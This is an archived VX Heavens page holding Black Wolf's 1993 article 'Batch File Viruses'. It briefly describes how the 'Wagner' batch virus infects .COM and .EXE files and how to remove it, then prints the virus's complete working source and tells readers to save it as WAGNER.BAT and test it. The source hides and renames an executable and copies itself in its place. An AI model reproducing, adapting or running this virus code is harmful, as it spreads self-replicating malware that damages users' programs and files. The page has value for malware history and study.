<html>
<head>
    <title>Batch File Viruses : VX Heavens</title>
    <meta http-eguiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="Author" content="herm1t">    
    <meta name="KeyWords" content="virus,virii,vx,×ÉÒÕÓ">
    <meta name="Description" content="...They are incredibly simple to write and requir no real programming experience, and  There are a growing number of programs that will convert .BAT  files into .COM and/or .EXE files...">
    <link rel=stylesheet type="text/css" href="../style.css">
    <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">    
</head>
<script><!-- 
  if (top.parent.frames.length > 0)
  	top.parent.location.href=self.location.href;
//--></script>

<body topmargin="0" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#cccbbb" text="#302000" link="#225599" vlink="#225599">
<a name="top"></a>
<table width="101%" border="0" bgcolor="#555444" cellspacing="0" cellpadding="0"><tr><td>
<table width="100%" border="0" cellspacing="1" cellpadding="1" align="center">
<tr bgcolor="#333222"><td colspan="8"><font size="-1" color="#777666"><b>VX Heavens</b></font></td></tr>
<tr bgcolor="#000000" align="center">
      <td><a href="../index.shtml">  <font size="-1" color="#666555"><b>Home</b></font></a></td>
      <td><a href="../news.shtml">   <font size="-1" color="#666555"><b>News</b></font></a></td>
      <td><a href="../lib.shtml">    <font size="-1" color="#666555"><b>Library</b></font></a></td>
      <td><a href="../src.shtml">    <font size="-1" color="#666555"><b>Sources</b></font></a></td>
      <td><a href="../bin.shtml">    <font size="-1" color="#666555"><b>Downloads</b></font></a></td>
      <td><a href="../links.php">    <font size="-1" color="#666555"><b>Links</b></font></a></td>  
      <td><a href="../search.shtml"> <font size="-1" color="#666555"><b>Search</b></font></a></td>
</tr></table></td></tr></table>

<table border="0" width="100%"><tr><td align=left valign=top>
<h1>Batch File Viruses</h1>
<p><b>Black Wolf</b>
  
<p><a href="../lib_vx.shtml#bw">[back to index]</a>
</td><td align="right" valign="top"><center>
<form action="/cgi-bin/print" method="post">
<input type="image" src="/img/print.gif" alt="PRINT" border="0"><br /><small>Get a print<br />version</small>
</form></center></td></tr></table>
<!-- This file passed through VX Heavens (http://vx.org.ua) -->
           
      
<p>Batch File viruses are becoming increasingly common, because o
two main reasons: 
<ol>
    <li> They are incredibly simple to write and requir
	no real programming experience, and 
    <li> There are a growing number of programs that will convert .BAT 
	files into .COM and/or .EXE files.
</ol>	
This allows the batch file to pose as an executable and prevents it
from being typed. The following virus, however, works in BAT format
It searches the directory for .COM files and .EXE files, finding th
last one in the directory. It then renames it to its name with a V
at the beginning, hides it, and puts a batch file with the same nam
into the directory that contains the virus. The commands used can
be found in an MS-DOS User's Manual. To cure it, read the
instructions within the virus itself simply by typing one of the
infected .BAT files. This, despite the fact that it is not an
'executable' program, is a virus and, like all others, can cause
damage if improperly handled. It will not go out of the directory,
unless it is run from another directory. As with anything that is
potentially dangerous, just be careful and use common sense. And
if you do not understand it, DO NOT PRESS YOUR LUCK BY PLAYING WITH
IT! Study the code and an MS-DOS manual until you do understand
it. I am not including an in-depth study of this virus due to its
simplicity. To create a working version of this virus, type the
code in between the dotted lines into a program such as EDIT.COM
that comes with DOS, and save it as WAGNER.BAT. Put it in an
isolated directory, and then you can test it. Again, be careful,
for it is YOUR responsibility for anything you do with it.

<p>The Wagner Virus
<xmp>
@echo off
ctty nul
rem ______________________________________________________________
rem :Wagner Virus, as presented in Virology 101 (c) 1993 Black Wolf
rem :This virus can be cured simply by typing "attrib -h -r *.*" in
rem :infected directories and deleting BAT files that are identical
rem :to this code, then rename the files having a "V" at the start
rem :to their original names. NOTE: Does not infect COMMAND.COM.
rem :______________________________________________________________
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% V%A%
if not exist V%A% goto end
attrib +h V%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist V%0.com V%0.com %1 %2 %3
@if exist V%0.exe V%0.exe %1 %2 %3
</xmp>
<p>See: Essays & Papers:<br>
- Batch File Viruses by Datafellows.

<!-- This file passed through VX Heavens (http://vx.org.ua) -->
<p><a href="../lib_vx.shtml#bw">[back to index]</a><a href="#top">[back to top]</a>
<table width="101%" border="0" bgcolor="#555444" cellspacing="0" cellpadding="0"><tr><td bgcolor=#cccbbb><img src="../img/1x1.gif" height="5" alt=""></td></tr><tr><td><table width="100%" border="0" cellspacing="1" cellpadding="1"><td bgcolor="#333222"><font size="-1" face="Arial" color="#777666"><b>VX Heavens &copy; 1999-2003 by herm1t</b></font></td></table></td></tr></table>
</body>
</html>